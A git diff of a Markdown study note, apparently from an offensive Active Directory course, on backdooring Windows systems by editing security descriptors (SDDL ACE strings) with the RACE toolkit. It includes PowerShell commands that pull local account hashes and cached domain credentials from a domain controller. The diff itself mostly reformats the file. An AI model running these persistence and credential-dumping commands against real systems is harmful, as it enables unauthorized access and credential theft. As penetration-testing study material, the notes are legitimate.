@@ -1,16 +1,25 @@
 ---
-{"publish":true,"created":"2025-02-23T23:53:09.702+05:30","modified":"2025-08-15T16:43:09.240+05:30","published":"2025-08-15T16:43:09.240+05:30","tags":["persistence"],"cssclasses":[]}
+publish: true
+created: 2025-02-23T23:53:09.702+05:30
+modified: 2025-08-15T16:43:09.240+05:30
+published: 2025-08-15T16:43:09.240+05:30
+tags:
+  - persistence
+cssclasses: []
 ---
 
 - It is possible to modify Security Descriptors (security information like Owner, primary group, D[[Access Control Model]], SACL) of multiple remote access methods (securable objects) to allow access to non-admin users
+
 - A very effective backdoor mechanism
+
 - Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:
-	`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`
-	
+  `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`
+
 - ACE for built-in administrators for WMI namespaces
-	`A;Cl;CCDCLCSWRPWPRCWD;;;SID`
+  `A;Cl;CCDCLCSWRPWPRCWD;;;SID`
+
 - ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:
-	`C:\AD\Tools\RACE-master\RACE.ps1`
+  `C:\AD\Tools\RACE-master\RACE.ps1`
 
 #### Using WMI
 
@@ -63,4 +72,3 @@ Get-RemoteLocalAccountHash -ComputerName domain-controller -Verbose
 ```powershell title:"Retrieve domain cached credentials on the remote machine"
 Get-RemoteCachedCredential -ComputerName domain-controller -Verbose
 ```
-
